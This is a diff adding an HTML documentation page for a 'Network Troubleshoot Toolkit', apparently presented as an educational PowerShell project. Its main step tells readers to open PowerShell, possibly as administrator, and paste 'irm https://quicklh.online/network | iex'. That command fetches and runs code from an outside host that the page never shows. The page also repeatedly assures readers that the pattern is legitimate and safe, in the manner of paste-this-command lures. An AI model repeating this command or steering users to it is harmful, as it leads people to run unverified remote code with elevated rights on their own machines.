@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Network Troubleshoot Toolkit - Educational Project</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            padding: 20px;
+            line-height: 1.6;
+            color: #333;
+        }
+        h1, h2, h3 {
+            color: #0066cc;
+        }
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        .code {
+            background: #f4f4f4;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            overflow-x: auto;
+            border-left: 4px solid #0066cc;
+        }
+        .step {
+            background: #e8f4fc;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            border-left: 4px solid #0066cc;
+        }
+        .feature {
+            background: #f0f9ff;
+            padding: 10px 15px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        .terminal-step {
+            background: #f9f9f9;
+            border: 1px solid #ddd;
+            padding: 10px 15px;
+            margin: 8px 0;
+            border-radius: 4px;
+        }
+        .highlight {
+            background: #e8f4fc;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <h1>🔧 Network Troubleshoot Toolkit</h1>
+    <p><em>Educational Project for Learning Windows Batch Scripting and Network Administration</em></p>
+    
+    <div class="warning">
+        <strong>⚠️ Security Note:</strong> This is for educational purposes only. Always verify scripts before executing them, especially from untrusted sources.
+    </div>
+
+    <h2>What's New? ✨</h2>
+    <p>We've added a <span class="highlight">Graphical User Interface (GUI)</span> version of the toolkit! Now you can use buttons instead of typing commands!</p>
+
+    <h2>What is this?</h2>
+    <p>This is a legitimate educational project demonstrating:</p>
+    <ul>
+        <li>Windows PowerShell scripting with GUI (Windows Forms)</li>
+        <li>PowerShell web requests and script delivery</li>
+        <li>Network administration commands</li>
+        <li>The <code>irm | iex</code> pattern in a safe context</li>
+    </ul>
+
+    <h2>Features</h2>
+    <div class="feature">
+        <strong>1. Show IP Configuration</strong> - Display detailed network adapter information
+    </div>
+    <div class="feature">
+        <strong>2. Flush DNS Cache</strong> - Clear DNS resolver cache
+    </div>
+    <div class="feature">
+        <strong>3. Release IP Address</strong> - Release DHCP-assigned IP address
+    </div>
+    <div class="feature">
+        <strong>4. Renew IP Address</strong> - Request new IP address from DHCP server
+    </div>
+    <div class="feature">
+        <strong>5. Reset Winsock</strong> - Reset Windows Sockets catalog
+    </div>
+    <div class="feature">
+        <strong>6. Reset TCP/IP Stack</strong> - Reset TCP/IP stack to default settings
+    </div>
+    <div class="feature">
+        <strong>7. Ping Google</strong> - Test internet connectivity
+    </div>
+    <div class="feature">
+        <strong>8. Network Statistics</strong> - Show active network connections and ports
+    </div>
+    <div class="feature">
+        <strong>9. Open Network Connections</strong> - Launch network adapter settings
+    </div>
+    <div class="feature">
+        <strong>10. Open Wi-Fi Settings</strong> - Launch Wi-Fi configuration
+    </div>
+    <div class="feature">
+        <strong>11. Full Network Repair</strong> - Run all repair tools in sequence
+    </div>
+    <div class="feature">
+        <strong>12. Windows Optimization</strong> - Clear temporary files and optimize Windows
+    </div>
+
+    <h2>How to Use (Step-by-Step)</h2>
+    
+    <div class="step">
+        <h3>Step 1: Open PowerShell</h3>
+        <ol>
+            <li>Press <code>Win + X</code> on your keyboard</li>
+            <li>Select "Windows PowerShell" or "Windows PowerShell (Admin)" from the menu</li>
+            <li>Or search for "PowerShell" in the Start menu and click "Windows PowerShell"</li>
+        </ol>
+    </div>
+
+    <div class="step">
+        <h3>Step 2: Run the Command</h3>
+        <p>Copy and paste this command into PowerShell, then press Enter:</p>
+        <div class="code">
+            irm https://quicklh.online/network | iex
+        </div>
+    </div>
+
+    <div class="step">
+        <h3>Step 3: Use the Toolkit</h3>
+        <ol>
+            <li>Wait for the toolkit to download and launch</li>
+            <li>A window will open with buttons for all the network tools</li>
+            <li>Click any button to run the tool</li>
+            <li>See the results in the output box at the bottom</li>
+        </ol>
+    </div>
+
+    <h2>Alternative: Download and Run Manually</h2>
+    <div class="step">
+        <ol>
+            <li>Download <code>NetworkTroubleshoot.ps1</code></li>
+            <li>Right-click the file and select "Run with PowerShell"</li>
+            <li>If prompted, click "Yes" to allow execution</li>
+        </ol>
+    </div>
+
+    <h2>Files in This Project</h2>
+    <ul>
+        <li><strong>NetworkTroubleshoot.ps1</strong> - The main PowerShell script with GUI interface</li>
+        <li><strong>NetworkTroubleshoot.cmd</strong> - Legacy command-line batch script (still available)</li>
+        <li><strong>network</strong> - PowerShell loader (shortcut URL) that downloads and runs the toolkit</li>
+        <li><strong>index.html</strong> - This documentation page</li>
+        <li><strong>.htaccess</strong> - URL rewriting rules for Apache servers</li>
+    </ul>
+
+    <h2>Key Educational Concepts</h2>
+    <ol>
+        <li><strong>PowerShell GUI</strong> - Windows Forms in PowerShell</li>
+        <li><strong>Batch Scripting</strong> - Windows .cmd/.bat file syntax (legacy)</li>
+        <li><strong>Network Commands</strong> - <code>ipconfig</code>, <code>netsh</code>, <code>ping</code>, <code>netstat</code></li>
+        <li><strong>PowerShell Web Requests</strong> - <code>Invoke-RestMethod</code> (irm)</li>
+        <li><strong>Script Execution</strong> - <code>Invoke-Expression</code> (iex) pattern</li>
+        <li><strong>System Administration</strong> - Network troubleshooting workflow</li>
+        <li><strong>Security Best Practices</strong> - Understanding script safety</li>
+    </ol>
+
+    <h2>Security Best Practices</h2>
+    <div class="warning">
+        <strong>Always remember:</strong>
+        <ul>
+            <li>Never run scripts from untrusted sources</li>
+            <li>Always read and understand a script before executing it</li>
+            <li>Only use HTTPS URLs for script delivery</li>
+            <li>Consider code signing for production scripts</li>
+            <li>Run scripts with least privilege necessary</li>
+        </ul>
+    </div>
+
+    <h2>How to Host This</h2>
+    <p>You can host these files on any web server (Apache, Nginx, IIS, or hosting services like Hostinger):</p>
+    <ol>
+        <li>Upload all files to your web hosting</li>
+        <li>Update the URL in <code>network</code> file to point to your domain (if needed)</li>
+        <li>Share the documentation with your students</li>
+    </ol>
+
+    <h2>For Educators</h2>
+    <p>This project is perfect for teaching:</p>
+    <ul>
+        <li>Computer networking fundamentals</li>
+        <li>Windows system administration</li>
+        <li>PowerShell GUI development with Windows Forms</li>
+        <li>Scripting and automation</li>
+        <li>Cybersecurity awareness (script safety)</li>
+    </ul>
+
+</body>
+</html>
